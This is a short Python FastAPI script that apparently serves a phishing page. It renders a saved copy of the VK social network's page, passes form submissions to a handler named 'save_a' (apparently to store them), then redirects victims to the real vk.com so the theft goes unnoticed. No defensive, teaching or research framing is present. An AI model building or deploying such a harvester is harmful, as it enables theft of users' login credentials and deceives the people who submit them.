import uvicorn
from fastapi import FastAPI, Form, Depends
from starlette import status
from starlette.responses import RedirectResponse
from starlette.staticfiles import StaticFiles
from starlette.templating import Jinja2Templates
from fastapi import Request
from router import save_a


app = FastAPI()
templates = Jinja2Templates(directory='templates')
app.mount('/static', StaticFiles(directory='static'), name='static')


@app.get("/index")
async def root(
        request: Request,
):

    return templates.TemplateResponse(
        name='https_vk.com/vk.com/index.html', context={'request': request}
    )


@app.post("/index")
async def root(
    user=Depends(save_a)
):
    return RedirectResponse(
        'https://vk.com',
        status_code=status.HTTP_302_FOUND)



# app.include_router(router)

if __name__ == "__main__":
    uvicorn.run("main:app", port=5000, log_level="info")